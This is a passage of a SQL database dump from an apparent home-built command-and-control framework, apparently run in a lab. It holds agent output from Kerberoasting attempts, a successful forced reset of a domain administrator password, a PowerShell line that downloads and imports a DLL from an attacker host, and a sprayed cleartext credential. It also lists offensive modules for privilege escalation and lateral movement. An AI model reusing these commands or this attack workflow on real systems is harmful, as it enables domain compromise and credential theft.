(253, '2023-05-15 23:38:07.373988', 14, 122, '.\r\nC2nan:#/\r\n===============TGStickets===============\r\n   ______        _                      \r\n  (_____ \\      | |                     \r\n   _____) )_   _| |__  _____ _   _  ___ \r\n  |  __  /| | | |  _ \\| ___ | | | |/___)\r\n  | |  \\ \\| |_| | |_) ) ____| |_| |___ |\r\n  |_|   |_|____/|____/|_____)____/(___/\r\n  v2.2.0 \r\n[*] Action: Kerberoasting\r\n[*] Using \'tgtdeleg\' to request a TGT for the current user\r\n[X] Error: AcquireCredentialsHandle error: -2146893042\r\n[!] Unhandled Rubeus exception:\r\nSystem.NullReferenceException: Object reference not set to an instance of an object.\r\n   at Rubeus.KRB_CRED..ctor(Byte[] bytes)\r\n   at Rubeus.Roast.Kerberoast(String spn, List`1 spns, String userName, String OUName, String domain, String dc, NetworkCredential cred, String outFile, Boolean simpleOutput, KRB_CRED TGT, Boolean useTGTdeleg, String supportedEType, String pwdSetAfter, String pwdSetBefore, String ldapFilter, Int32 resultLimit, Int32 delay, Int32 jitter, Boolean userStats, Boolean enterprise, Boolean autoenterprise, Boolean ldaps, String nopreauth)\r\n   at Rubeus.Commands.Kerberoast.Execute(Dictionary`2 arguments)\r\n   at Rubeus.Domain.CommandCollection.ExecuteCommand(String commandName, Dictionary`2 arguments)\r\n   at Rubeus.Program.MainExecute(String commandName, Dictionary`2 parsedArgs) ', 1),
(254, '2023-05-15 23:38:58.065071', 14, 122, '.\r\nC2nan:#/\r\n===============TGStickets===============\r\n   ______        _                      \r\n  (_____ \\      | |                     \r\n   _____) )_   _| |__  _____ _   _  ___ \r\n  |  __  /| | | |  _ \\| ___ | | | |/___)\r\n  | |  \\ \\| |_| | |_) ) ____| |_| |___ |\r\n  |_|   |_|____/|____/|_____)____/(___/\r\n  v2.2.0 \r\n[*] Action: Kerberoasting\r\n[*] Target User            : john\r\n[*] Target Domain          : Normal.users\r\n[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.\r\n[*] NOTICE: AES hashes will be returned for AES-enabled accounts.\r\n[*] Searching path \'LDAP://LAB-DC-01.Normal.users/DC=Normal,DC=users\' for \'(&(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=john)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))\'\r\n[X] Error executing the domain searcher: An operations error occurred.\r\n[X] LDAP query failed, try specifying more domain information or specific SPNs. ', 1),
(255, '2023-05-15 23:41:00.086426', 14, 122, '.\r\nC2nan:#/\r\n===============TGStickets===============\r\n   ______        _                      \r\n  (_____ \\      | |                     \r\n   _____) )_   _| |__  _____ _   _  ___ \r\n  |  __  /| | | |  _ \\| ___ | | | |/___)\r\n  | |  \\ \\| |_| | |_) ) ____| |_| |___ |\r\n  |_|   |_|____/|____/|_____)____/(___/\r\n  v2.2.0 \r\n[*] Action: Kerberoasting\r\n[*] Listing statistics about target users, no ticket requests being performed.\r\n[*] Target Domain          : Normal.users\r\n[*] Searching path \'LDAP://LAB-DC-01.Normal.users/DC=Normal,DC=users\' for \'(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))\'\r\n[X] Error executing the domain searcher: An operations error occurred.\r\n[X] LDAP query failed, try specifying more domain information or specific SPNs. ', 1),
(256, '2023-05-16 00:14:06.193058', 14, 113, NULL, 1),
(257, '2023-05-16 00:14:16.245762', 14, 113, NULL, 1),
(258, '2023-05-16 00:14:52.736295', 14, 113, NULL, 1),
(259, '2023-05-16 00:30:15.819971', 14, 117, '.\r\nC2nan:#/\r\n===============Force\r\nChange\r\nPassword===============\r\nVERBOSE: [Get-PrincipalContext] Using alternate credentials\r\nVERBOSE: [Set-DomainUserPassword] Attempting to set the password for user \'administrator\'\r\nVERBOSE: [Set-DomainUserPassword] Password for user \'administrator\' successfully reset ', 1),
(260, '2023-05-16 11:59:25.074309', 14, 33, NULL, 1),
(261, '2023-05-16 12:01:15.580874', 14, 33, NULL, 1),
(262, '2023-05-16 12:02:05.645764', 14, 37, '.\r\nC2nan:#/\r\n===============Get-ADDomain=============== Exception calling \"DownloadFile\" with \"2\" argument(s): \"An exception occurred during a WebClient request.\"\r\nAt line:1 char:1\r\n+ (New-Object Net.WebClient).DownloadFile(\'http://192.168.116.129:8888/ ...\r\n+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException\r\n    + FullyQualifiedErrorId : WebException\r\n \r\nimport-module : The specified module \'c:/users/hasan/MAMAD.dll\' was not loaded because no valid module file was found \r\nin any module directory.\r\nAt line:1 char:110\r\n+ ... sers/hasan/MAMAD.dll\');import-module c:/users/hasan/MAMAD.dll;echo .  ...\r\n+                            ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n    + CategoryInfo          : ResourceUnavailable: (c:/users/hasan/MAMAD.dll:String) [Import-Module], FileNotFoundExce \r\n   ption\r\n    + FullyQualifiedErrorId : Modules_ModuleNotFound,Microsoft.PowerShell.Commands.ImportModuleCommand\r\n \r\nGet-ADDomain : The term \'Get-ADDomain\' is not recognized as the name of a cmdlet, function, script file, or operable \r\nprogram. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.\r\nAt line:1 char:211\r\n+ ... #/`r`n===============Get-ADDomain===============;Get-ADDomain;echo  ` ...\r\n+                                                      ~~~~~~~~~~~~\r\n    + CategoryInfo          : ObjectNotFound: (Get-ADDomain:String) [], CommandNotFoundException\r\n    + FullyQualifiedErrorId : CommandNotFoundException', 1),
(263, '2023-05-16 12:03:23.080730', 14, 113, NULL, 1),
(264, '2023-05-16 12:05:00.640877', 14, 111, 'OutPut in the following path:\n/root/Desktop/c2Https-motest/blog/Modules/ActiveDirectory/../../data/listeners/agents/JXTIEW/', 1),
(265, '2023-05-16 12:07:14.176758', 14, 112, 'SMB         192.168.116.184 445    LAB-DC-01        [+] Normal.users\\ahmed:P@ssw0rd \n', 1);

-- --------------------------------------------------------

--
-- Table structure for table `blog_listenerform`
--

CREATE TABLE `blog_listenerform` (
  `id` bigint(20) NOT NULL,
  `interface` varchar(100) NOT NULL,
  `created_date` datetime(6) NOT NULL,
  `stoped_date` datetime(6) DEFAULT NULL,
  `ip` varchar(200) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Dumping data for table `blog_listenerform`
--

INSERT INTO `blog_listenerform` (`id`, `interface`, `created_date`, `stoped_date`, `ip`) VALUES
(33, 'eth0', '2023-05-16 12:30:24.915035', NULL, '192.168.116.129');

-- --------------------------------------------------------

--
-- Table structure for table `blog_modules`
--

CREATE TABLE `blog_modules` (
  `id` bigint(20) NOT NULL,
  `module_name` varchar(200) NOT NULL,
  `module_type` int(11) NOT NULL,
  `created_date` datetime(6) NOT NULL,
  `description` longtext DEFAULT NULL,
  `reference` longtext DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Dumping data for table `blog_modules`
--

INSERT INTO `blog_modules` (`id`, `module_name`, `module_type`, `created_date`, `description`, `reference`) VALUES
(1, 'Applocker', 1, '2022-11-30 18:26:02.783229', NULL, NULL),
(2, 'DirectoryListing', 1, '2022-11-30 18:26:14.992253', NULL, NULL),
(3, 'Download', 1, '2022-11-30 18:26:34.543678', NULL, NULL),
(4, 'env_var', 1, '2022-11-30 18:27:04.836591', NULL, NULL),
(5, 'Phrase_finder', 1, '2022-11-30 18:27:15.390513', NULL, NULL),
(6, 'IPs', 1, '2022-11-30 18:27:31.477543', NULL, NULL),
(7, 'logged_users', 1, '2022-11-30 18:27:41.200079', NULL, NULL),
(8, 'Net_Connections', 1, '2022-11-30 18:27:49.279695', NULL, NULL),
(9, 'Programs', 1, '2022-11-30 18:28:06.727387', NULL, NULL),
(10, 'processes', 1, '2022-11-30 18:28:15.465485', NULL, NULL),
(11, 'screenshot', 1, '2022-11-30 18:28:41.519129', NULL, NULL),
(12, 'user_info', 1, '2022-11-30 18:29:12.336266', NULL, NULL),
(13, 'Systeminfo', 1, '2022-11-30 18:29:21.325056', NULL, NULL),
(14, 'Updates', 1, '2022-11-30 18:29:46.847832', NULL, NULL),
(15, 'Upload', 1, '2022-11-30 18:29:55.945993', NULL, NULL),
(16, 'WinDefStat', 1, '2022-11-30 18:30:05.703401', NULL, NULL),
(17, 'Named_pipes', 1, '2022-12-08 16:56:34.506216', NULL, NULL),
(18, 'juicypotato', 1, '2022-12-08 16:57:03.065772', NULL, NULL),
(19, 'Apache', 2, '2022-12-08 17:11:11.724291', NULL, NULL),
(20, 'Available Shell', 2, '2022-12-08 17:11:50.364717', NULL, NULL),
(21, 'Cronjobs', 2, '2022-12-08 17:12:04.265437', NULL, NULL),
(22, 'Hidden Files', 2, '2022-12-08 17:17:38.682779', NULL, NULL),
(23, 'Lsof', 2, '2022-12-08 17:18:48.406120', NULL, NULL),
(24, 'OS info', 2, '2022-12-08 17:19:12.653008', NULL, NULL),
(25, 'Processes', 2, '2022-12-08 17:19:34.693143', NULL, NULL),
(26, 'Selinux', 2, '2022-12-08 17:19:54.149273', NULL, NULL),
(27, 'SpecialPermissions', 2, '2022-12-08 17:20:08.475925', NULL, NULL),
(28, 'TCP_UDP', 2, '2022-12-08 17:20:19.301327', NULL, NULL),
(29, 'usr_priv', 2, '2022-12-08 17:21:20.412562', NULL, NULL),
(30, 'Usrs info', 2, '2022-12-08 17:21:34.429383', NULL, NULL),
(31, 'Whoami', 2, '2022-12-08 17:21:49.652072', NULL, NULL),
(32, 'ACCsforKerb', 3, '2022-12-15 10:37:41.311403', NULL, NULL),
(33, 'ACC_listing', 3, '2022-12-15 10:37:52.716298', NULL, NULL),
(34, 'adapter', 3, '2022-12-15 10:38:31.926101', NULL, NULL),
(35, 'ArpTable', 3, '2022-12-15 10:38:58.079113', NULL, NULL),
(36, 'DefenseCheck', 3, '2022-12-15 10:40:55.564223', NULL, NULL),
(37, 'DomainInfo', 3, '2022-12-15 10:41:09.296096', NULL, NULL),
(38, 'DomainUsers', 3, '2022-12-15 10:41:20.009499', NULL, NULL),
(39, 'DownloadWindows', 3, '2022-12-15 10:43:19.652034', NULL, NULL),
(40, 'EnvValue', 3, '2022-12-15 10:43:42.971482', NULL, NULL),
(41, 'GroupsListing', 3, '2022-12-15 10:46:45.783833', NULL, NULL),
(42, 'Groups', 3, '2022-12-15 10:47:02.101555', NULL, NULL),
(43, 'HotFixes', 3, '2022-12-15 10:48:15.659150', NULL, NULL),
(44, 'Ip4Route', 3, '2022-12-15 10:48:46.553516', NULL, NULL),
(45, 'ListExecPolicies', 3, '2022-12-15 10:49:09.896642', NULL, NULL),
(46, 'ListingModules', 3, '2022-12-15 10:49:57.328136', NULL, NULL),
(48, 'SysaccListing', 3, '2022-12-15 10:52:16.025370', NULL, NULL),
(49, 'TrustMap', 3, '2022-12-15 10:52:28.196381', NULL, NULL),
(50, 'TrustRelation', 3, '2022-12-15 10:52:39.049673', NULL, NULL),
(51, 'LinuxChangeDirectory', 2, '2022-12-18 23:21:32.341000', NULL, NULL),
(52, 'LinuxChmod', 2, '2022-12-18 21:25:46.204611', NULL, NULL),
(53, 'Linuxcp', 2, '2022-12-18 21:26:08.152148', NULL, NULL),
(54, 'Linuxgcc', 2, '2022-12-18 21:26:19.608549', NULL, NULL),
(55, 'LinuxDirectoryListing_Details', 2, '2022-12-18 21:26:28.874146', NULL, NULL),
(56, 'LinuxDirectoryListing', 2, '2022-12-18 21:26:38.364323', NULL, NULL),
(57, 'LinuxMakeDirectory', 2, '2022-12-18 21:27:06.284330', NULL, NULL),
(58, 'LinuxNetdiscover', 2, '2022-12-18 21:27:15.132191', NULL, NULL),
(59, 'LinuxTouch', 2, '2022-12-18 21:27:24.934685', NULL, NULL),
(60, 'LinuxBash', 2, '2022-12-18 21:27:39.662675', NULL, NULL),
(61, 'ffuf', 2, '2022-12-18 21:30:47.504490', NULL, NULL),
(62, 'ExecuteCommandWithSpecUser', 2, '2022-12-18 21:31:03.311151', NULL, NULL),
(63, 'DownloadOnAgent', 2, '2022-12-18 22:29:40.389482', NULL, NULL),
(64, 'Fuff', 4, '2023-02-10 12:40:31.026431', NULL, NULL),
(65, 'Active_Dir System Info', 3, '2023-02-28 21:21:41.371384', NULL, NULL),
(67, 'Active_Dir DomainUsers', 3, '2023-02-28 21:22:06.768356', NULL, NULL),
(68, 'Download_IWR', 1, '2023-03-01 12:32:19.750931', NULL, NULL),
(69, 'DownloadFileAsync', 1, '2023-03-01 12:32:28.803945', NULL, NULL),
(70, 'DownloadString', 1, '2023-03-01 12:32:39.432269', NULL, NULL),
(71, 'Download_SMB', 1, '2023-03-01 12:32:45.402699', NULL, NULL),
(72, 'Download_FTP', 1, '2023-03-01 12:32:52.781707', NULL, NULL),
(73, 'Invoke_fileUpload', 1, '2023-03-01 12:32:59.230769', NULL, NULL),
(74, 'FTP_fileUpload', 1, '2023-03-01 12:33:06.858632', NULL, NULL),
(75, 'open_pythonserver', 1, '2023-03-01 12:33:14.083714', NULL, NULL),
(76, 'open_SMBserver', 1, '2023-03-01 12:33:19.990386', NULL, NULL),
(77, 'open_FTPserver', 1, '2023-03-01 12:33:26.242055', NULL, NULL),
(78, 'open_PY_UploadServer', 1, '2023-03-01 12:33:31.701250', NULL, NULL),
(79, 'open_FTP_UploadServer', 1, '2023-03-01 12:33:37.197153', NULL, NULL),
(80, 'Perm_pip', 1, '2023-03-01 12:33:45.250655', NULL, NULL),
(81, 'printspoofer', 1, '2023-03-01 12:33:50.450487', NULL, NULL),
(82, 'procdump', 1, '2023-03-01 12:33:55.854386', NULL, NULL),
(83, 'tasklist', 1, '2023-03-01 12:34:01.358276', NULL, NULL),
(84, 'SeDebugPrivilege', 1, '2023-03-01 12:34:07.606145', NULL, NULL),
(85, 'Import_Module', 1, '2023-03-01 12:34:13.782410', NULL, NULL),
(86, 'Exec_Module', 1, '2023-03-01 12:34:20.635052', NULL, NULL),
(87, 'Chk_File_Owner', 1, '2023-03-01 12:34:25.639413', NULL, NULL),
(88, 'Take_Own', 1, '2023-03-01 12:34:30.653266', NULL, NULL),
(89, 'ACL_modify', 1, '2023-03-01 12:34:36.164470', NULL, NULL),
(90, 'SeBackUpPrivelege', 1, '2023-03-01 12:34:41.278826', NULL, NULL),
(91, 'Auto_SeDebugPrivilege', 5, '2023-03-12 12:58:58.277679', NULL, NULL),
(92, 'linkedin_users', 3, '2023-05-04 14:34:39.495522', NULL, NULL),
(93, 'EnumSMBShares', 3, '2023-05-04 14:34:54.119010', NULL, NULL),
(94, 'TestingCreds_onDC', 3, '2023-05-04 14:35:09.037962', NULL, NULL),
(95, 'userenum_withcreds', 3, '2023-05-04 14:35:20.240545', NULL, NULL),
(96, 'fbing', 3, '2023-05-04 14:36:14.395695', NULL, NULL),
(97, 'DomainControllers', 3, '2023-05-04 14:45:28.388516', NULL, NULL),
(98, 'groupInfo', 3, '2023-05-04 14:47:39.434187', NULL, NULL),
(99, 'ImportModule', 3, '2023-05-04 14:48:43.837463', NULL, NULL),
(100, 'loggedinUsers', 3, '2023-05-04 14:48:56.448636', NULL, NULL),
(101, 'TrustMap', 3, '2023-05-04 15:11:21.554127', NULL, NULL),
(102, 'Download_IWR', 3, '2023-05-04 15:11:39.193827', NULL, NULL),
(103, 'DownloadString', 3, '2023-05-04 15:13:56.404806', NULL, NULL),
(104, 'Download_SMB', 3, '2023-05-04 15:14:09.276970', NULL, NULL),
(105, 'Download_FTP', 3, '2023-05-04 15:14:15.874719', NULL, NULL),
(106, 'open_pythonserver', 3, '2023-05-04 15:14:22.938889', NULL, NULL),
(107, 'open_SMBserver', 3, '2023-05-04 15:14:29.755486', NULL, NULL),
(108, 'open_FTPserver', 3, '2023-05-04 15:14:34.298030', NULL, NULL),
(109, 'open_PY_UploadServer', 3, '2023-05-04 15:14:38.663447', NULL, NULL),
(110, 'open_FTP_UploadServer', 3, '2023-05-04 15:14:43.989399', NULL, NULL),
(111, 'UserEnumwithKerbrute', 3, '2023-05-05 00:21:01.932677', NULL, NULL),
(112, 'CME_pass_spray', 3, '2023-05-05 00:21:01.932677', NULL, NULL),
(113, 'LateralMov_RDP', 3, '2023-05-05 04:29:02.000000', NULL, NULL),
(114, 'TGSticketsGetSPNusers', 3, '2023-05-05 14:55:14.000000', NULL, NULL),
(115, 'sharp', 3, '2023-05-05 15:15:19.000000', NULL, NULL),
(116, 'UserGeneralInfo', 3, '2023-05-05 20:22:59.000000', NULL, NULL),
(117, 'forceChangePassDomainUserPassword', 3, '2023-05-06 01:13:03.000000', NULL, NULL),
(118, 'LateralMov_WinRM', 3, '2023-05-06 16:15:41.000000', '', ''),
(119, 'gpp_Autologin', 3, '2023-05-14 21:47:35.505270', '', ''),
(121, 'CreateFake_SPN', 3, '2023-05-14 21:50:44.876248', 'Create fake SPN for a user', 'PowerView'),
(122, 'TGStickets_Rubeus', 3, '2023-05-15 18:20:38.378624', '', '');

-- --------------------------------------------------------

--
-- Table structure for table `django_admin_log`
--

CREATE TABLE `django_admin_log` (
  `id` int(11) NOT NULL,
  `action_time` datetime(6) NOT NULL,
  `object_id` longtext DEFAULT NULL,
  `object_repr` varchar(200) NOT NULL,
  `action_flag` smallint(5) UNSIGNED NOT NULL CHECK (`action_flag` >= 0),
  `change_message` longtext NOT NULL,
  `content_type_id` int(11) DEFAULT NULL,
  `user_id` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Dumping data for table `django_admin_log`
--

INSERT INTO `django_admin_log` (`id`, `action_time`, `object_id`, `object_repr`, `action_flag`, `change_message`, `content_type_id`, `user_id`) VALUES
(1, '2022-10-20 11:50:46.597770', '1', 'ListenerForm object (1)', 1, '[{\"added\": {}}]', 7, 1),
(2, '2022-10-20 11:51:04.250933', '1', 'ListenerForm object (1)', 3, '', 7, 1),
(3, '2022-10-20 12:37:20.412558', '2', 'ListenerForm object (2)', 1, '[{\"added\": {}}]', 7, 1),
(4, '2022-10-20 13:18:12.551865', '2', 'ListenerForm object (2)', 3, '', 7, 1),
(5, '2022-10-20 13:54:16.939821', '3', 'ListenerForm object (3)', 1, '[{\"added\": {}}]', 7, 1),
(6, '2022-10-20 14:04:13.649079', '3', 'ListenerForm object (3)', 3, '', 7, 1),
(7, '2022-10-20 14:04:17.422237', '4', 'ListenerForm object (4)', 3, '', 7, 1),
(8, '2022-10-20 20:41:44.272795', '5', 'ListenerForm object (5)', 3, '', 7, 1),
(9, '2022-10-20 20:41:44.284764', '6', 'ListenerForm object (6)', 3, '', 7, 1),
(10, '2022-10-21 18:00:39.013807', '2', 'tamer', 2, '[{\"changed\": {\"fields\": [\"Superuser status\"]}}]', 5, 1),
(11, '2022-10-21 18:01:35.128352', '2', 'tamer', 2, '[{\"changed\": {\"fields\": [\"Staff status\"]}}]', 5, 1),
(12, '2022-10-21 18:41:30.923148', '3', 'rana', 2, '[{\"changed\": {\"fields\": [\"Staff status\", \"Superuser status\"]}}]', 5, 1),
(13, '2022-10-21 18:42:11.080390', '3', 'rana', 2, '[{\"changed\": {\"fields\": [\"Staff status\", \"Superuser status\"]}}]', 5, 1),
(14, '2022-11-30 18:26:02.785228', '1', 'Modules object (1)', 1, '[{\"added\": {}}]', 10, 1),
(15, '2022-11-30 18:26:14.993254', '2', 'Modules object (2)', 1, '[{\"added\": {}}]', 10, 1),
(16, '2022-11-30 18:26:34.544678', '3', 'Modules object (3)', 1, '[{\"added\": {}}]', 10, 1),
(17, '2022-11-30 18:26:45.448295', '2', 'Modules object (2)', 2, '[{\"changed\": {\"fields\": [\"Module type\"]}}]', 10, 1),
(18, '2022-11-30 18:27:04.837587', '4', 'Modules object (4)', 1, '[{\"added\": {}}]', 10, 1),
(19, '2022-11-30 18:27:15.391493', '5', 'Modules object (5)', 1, '[{\"added\": {}}]', 10, 1),
(20, '2022-11-30 18:27:31.478543', '6', 'Modules object (6)', 1, '[{\"added\": {}}]', 10, 1),
(21, '2022-11-30 18:27:41.202071', '7', 'Modules object (7)', 1, '[{\"added\": {}}]', 10, 1),
(22, '2022-11-30 18:27:49.280710', '8', 'Modules object (8)', 1, '[{\"added\": {}}]', 10, 1),
(23, '2022-11-30 18:28:06.729385', '9', 'Modules object (9)', 1, '[{\"added\": {}}]', 10, 1),
(24, '2022-11-30 18:28:15.466510', '10', 'Modules object (10)', 1, '[{\"added\": {}}]', 10, 1),
(25, '2022-11-30 18:28:41.520143', '11', 'Modules object (11)', 1, '[{\"added\": {}}]', 10, 1),
(26, '2022-11-30 18:29:12.337269', '12', 'Modules object (12)', 1, '[{\"added\": {}}]', 10, 1),
(27, '2022-11-30 18:29:21.326056', '13', 'Modules object (13)', 1, '[{\"added\": {}}]', 10, 1),
(28, '2022-11-30 18:29:46.848830', '14', 'Modules object (14)', 1, '[{\"added\": {}}]', 10, 1),
(29, '2022-11-30 18:29:55.947982', '15', 'Modules object (15)', 1, '[{\"added\": {}}]', 10, 1),
(30, '2022-11-30 18:30:05.704414', '16', 'Modules object (16)', 1, '[{\"added\": {}}]', 10, 1),
(31, '2022-11-30 22:23:27.143293', '7', 'ListenerForm object (7)', 3, '', 7, 1),
(32, '2022-11-30 22:23:27.151225', '8', 'ListenerForm object (8)', 3, '', 7, 1),
(33, '2022-11-30 22:23:27.154209', '9', 'ListenerForm object (9)', 3, '', 7, 1),
(34, '2022-11-30 22:23:27.159208', '10', 'ListenerForm object (10)', 3, '', 7, 1),
(35, '2022-11-30 22:23:27.162209', '11', 'ListenerForm object (11)', 3, '', 7, 1),
(36, '2022-12-08 16:56:34.507216', '17', 'Modules object (17)', 1, '[{\"added\": {}}]', 10, 1),
(37, '2022-12-08 16:57:03.066785', '18', 'Modules object (18)', 1, '[{\"added\": {}}]', 10, 1),
(38, '2022-12-08 17:11:11.726291', '19', 'Modules object (19)', 1, '[{\"added\": {}}]', 10, 1),
(39, '2022-12-08 17:11:50.365903', '20', 'Modules object (20)', 1, '[{\"added\": {}}]', 10, 1),
(40, '2022-12-08 17:12:04.265437', '21', 'Modules object (21)', 1, '[{\"added\": {}}]', 10, 1),
(41, '2022-12-08 17:17:38.686461', '22', 'Modules object (22)', 1, '[{\"added\": {}}]', 10, 1),
(42, '2022-12-08 17:18:48.407119', '23', 'Modules object (23)', 1, '[{\"added\": {}}]', 10, 1),
(43, '2022-12-08 17:19:12.654009', '24', 'Modules object (24)', 1, '[{\"added\": {}}]', 10, 1),
(44, '2022-12-08 17:19:34.693143', '25', 'Modules object (25)', 1, '[{\"added\": {}}]', 10, 1),
(45, '2022-12-08 17:19:54.150275', '26', 'Modules object (26)', 1, '[{\"added\": {}}]', 10, 1),
(46, '2022-12-08 17:20:08.477130', '27', 'Modules object (27)', 1, '[{\"added\": {}}]', 10, 1),
(47, '2022-12-08 17:20:19.302327', '28', 'Modules object (28)', 1, '[{\"added\": {}}]', 10, 1),
(48, '2022-12-08 17:21:20.413562', '29', 'Modules object (29)', 1, '[{\"added\": {}}]', 10, 1),
(49, '2022-12-08 17:21:34.431386', '30', 'Modules object (30)', 1, '[{\"added\": {}}]', 10, 1),
(50, '2022-12-08 17:21:49.653070', '31', 'Modules object (31)', 1, '[{\"added\": {}}]', 10, 1),
(51, '2022-12-08 22:18:54.394908', '12', 'ListenerForm object (12)', 3, '', 7, 1),
(52, '2022-12-08 22:18:54.398904', '13', 'ListenerForm object (13)', 3, '', 7, 1),
(53, '2022-12-08 22:18:54.402905', '14', 'ListenerForm object (14)', 3, '', 7, 1),
(54, '2022-12-08 22:18:54.405905', '15', 'ListenerForm object (15)', 3, '', 7, 1),
(55, '2022-12-08 22:18:54.409905', '16', 'ListenerForm object (16)', 3, '', 7, 1),
(56, '2022-12-08 22:18:54.413592', '17', 'ListenerForm object (17)', 3, '', 7, 1),
(57, '2022-12-08 22:18:54.416547', '18', 'ListenerForm object (18)', 3, '', 7, 1),
(58, '2022-12-08 22:18:54.420547', '19', 'ListenerForm object (19)', 3, '', 7, 1),
(59, '2022-12-08 22:18:54.424547', '20', 'ListenerForm object (20)', 3, '', 7, 1),
(60, '2022-12-08 22:18:54.427549', '21', 'ListenerForm object (21)', 3, '', 7, 1),
(61, '2022-12-13 16:05:13.792654', '1', 'Agent object (1)', 1, '[{\"added\": {}}]', 8, 1),
(62, '2022-12-13 16:06:08.773981', '1', 'Agent object (1)', 3, '', 8, 1),
(63, '2022-12-13 16:06:45.262209', '22', 'ListenerForm object (22)', 3, '', 7, 1),
(64, '2022-12-13 16:06:45.274172', '23', 'ListenerForm object (23)', 3, '', 7, 1),
(65, '2022-12-13 16:06:45.277171', '24', 'ListenerForm object (24)', 3, '', 7, 1),
(66, '2022-12-13 16:06:45.280169', '25', 'ListenerForm object (25)', 3, '', 7, 1),
(67, '2022-12-13 16:06:45.284176', '26', 'ListenerForm object (26)', 3, '', 7, 1),
(68, '2022-12-13 16:06:45.287170', '27', 'ListenerForm object (27)', 3, '', 7, 1),
(69, '2022-12-13 16:06:45.290170', '28', 'ListenerForm object (28)', 3, '', 7, 1),
(70, '2022-12-13 16:06:45.295170', '29', 'ListenerForm object (29)', 3, '', 7, 1),
(71, '2022-12-13 16:06:45.298175', '30', 'ListenerForm object (30)', 3, '', 7, 1),
(72, '2022-12-15 10:37:41.311403', '32', 'Modules object (32)', 1, '[{\"added\": {}}]', 10, 1),
(73, '2022-12-15 10:37:52.718302', '33', 'Modules object (33)', 1, '[{\"added\": {}}]', 10, 1),
(74, '2022-12-15 10:38:31.927099', '34', 'Modules object (34)', 1, '[{\"added\": {}}]', 10, 1),
(75, '2022-12-15 10:38:58.080801', '35', 'Modules object (35)', 1, '[{\"added\": {}}]', 10, 1),
(76, '2022-12-15 10:40:22.449796', '35', 'Modules object (35)', 2, '[{\"changed\": {\"fields\": [\"Module name\"]}}]', 10, 1),
(77, '2022-12-15 10:40:55.564223', '36', 'Modules object (36)', 1, '[{\"added\": {}}]', 10, 1),
(78, '2022-12-15 10:41:09.297096', '37', 'Modules object (37)', 1, '[{\"added\": {}}]', 10, 1),
(79, '2022-12-15 10:41:20.009499', '38', 'Modules object (38)', 1, '[{\"added\": {}}]', 10, 1),
(80, '2022-12-15 10:43:19.654688', '39', 'Modules object (39)', 1, '[{\"added\": {}}]', 10, 1),
(81, '2022-12-15 10:43:42.971482', '40', 'Modules object (40)', 1, '[{\"added\": {}}]', 10, 1),
(82, '2022-12-15 10:44:51.438967', '31', 'ListenerForm object (31)', 1, '[{\"added\": {}}]', 7, 1),
(83, '2022-12-15 10:45:01.454617', '32', 'ListenerForm object (32)', 1, '[{\"added\": {}}]', 7, 1),
(84, '2022-12-15 10:45:17.315539', '31', 'ListenerForm object (31)', 3, '', 7, 1),
(85, '2022-12-15 10:45:24.695870', '32', 'ListenerForm object (32)', 3, '', 7, 1),
(86, '2022-12-15 10:46:45.783833', '41', 'Modules object (41)', 1, '[{\"added\": {}}]', 10, 1),
(87, '2022-12-15 10:47:02.101555', '42', 'Modules object (42)', 1, '[{\"added\": {}}]', 10, 1),
(88, '2022-12-15 10:48:15.660592', '43', 'Modules object (43)', 1, '[{\"added\": {}}]', 10, 1),
(89, '2022-12-15 10:48:46.555255', '44', 'Modules object (44)', 1, '[{\"added\": {}}]', 10, 1),
(90, '2022-12-15 10:49:09.896642', '45', 'Modules object (45)', 1, '[{\"added\": {}}]', 10, 1),
(91, '2022-12-15 10:49:57.329142', '46', 'Modules object (46)', 1, '[{\"added\": {}}]', 10, 1),
(92, '2022-12-15 10:50:16.072694', '47', 'Modules object (47)', 1, '[{\"added\": {}}]', 10, 1),
(93, '2022-12-15 10:52:16.035628', '48', 'Modules object (48)', 1, '[{\"added\": {}}]', 10, 1),
(94, '2022-12-15 10:52:28.198380', '49', 'Modules object (49)', 1, '[{\"added\": {}}]', 10, 1),
(95, '2022-12-15 10:52:39.050674', '50', 'Modules object (50)', 1, '[{\"added\": {}}]', 10, 1),
(96, '2022-12-15 15:42:16.374892', '4', 'Agent object (4)', 3, '', 8, 1),
(97, '2022-12-15 15:42:16.398069', '3', 'Agent object (3)', 3, '', 8, 1),
(98, '2022-12-15 15:42:16.416381', '2', 'Agent object (2)', 3, '', 8, 1),
(99, '2022-12-18 21:25:46.206252', '52', 'Modules object (52)', 1, '[{\"added\": {}}]', 10, 1),
(100, '2022-12-18 21:26:08.154898', '53', 'Modules object (53)', 1, '[{\"added\": {}}]', 10, 1),
(101, '2022-12-18 21:26:19.610124', '54', 'Modules object (54)', 1, '[{\"added\": {}}]', 10, 1),
(102, '2022-12-18 21:26:28.876018', '55', 'Modules object (55)', 1, '[{\"added\": {}}]', 10, 1),
(103, '2022-12-18 21:26:38.367864', '56', 'Modules object (56)', 1, '[{\"added\": {}}]', 10, 1),
(104, '2022-12-18 21:27:06.285852', '57', 'Modules object (57)', 1, '[{\"added\": {}}]', 10, 1),
(105, '2022-12-18 21:27:15.133962', '58', 'Modules object (58)', 1, '[{\"added\": {}}]', 10, 1),
(106, '2022-12-18 21:27:24.936078', '59', 'Modules object (59)', 1, '[{\"added\": {}}]', 10, 1),
(107, '2022-12-18 21:27:39.664126', '60', 'Modules object (60)', 1, '[{\"added\": {}}]', 10, 1),
(108, '2022-12-18 21:30:47.506313', '61', 'Modules object (61)', 1, '[{\"added\": {}}]', 10, 1),
(109, '2022-12-18 21:31:03.313233', '62', 'Modules object (62)', 1, '[{\"added\": {}}]', 10, 1),
(110, '2022-12-18 22:29:40.391017', '63', 'Modules object (63)', 1, '[{\"added\": {}}]', 10, 1),
(111, '2023-02-02 23:48:41.057633', '61', 'Modules object (61)', 2, '[{\"changed\": {\"fields\": [\"Module name\"]}}]', 10, 1),
